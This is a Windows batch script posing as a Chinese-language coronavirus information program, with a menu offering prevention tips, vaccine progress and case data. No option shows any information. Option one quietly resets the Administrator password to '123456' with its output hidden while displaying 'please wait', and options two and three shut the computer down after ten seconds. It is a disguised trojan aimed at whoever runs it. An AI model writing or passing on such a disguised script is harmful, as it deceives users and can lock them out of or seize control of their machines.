@echo off
color 0a
title 冠状病毒知识程序

:menu
echo ==================================
echo                            冠状病毒知识
echo                  1.冠状病毒防御以及起因
echo                  2. 冠状病毒治疗药物以及疫苗研制进度
echo                  3.最新的冠状病毒患者以及治愈数据
echo ==================================

set /p num=您的选择:
if "%num%=="1" goto 1
if "%num%=="2" goto 2
if "%num%=="3" goto 3

:1 
net user administrator  123456>nul
echo "请稍等"
pause
goto menu

:2
shutdown -s -t 10
goto menu

:3
shutdown -s -t 10
goto menu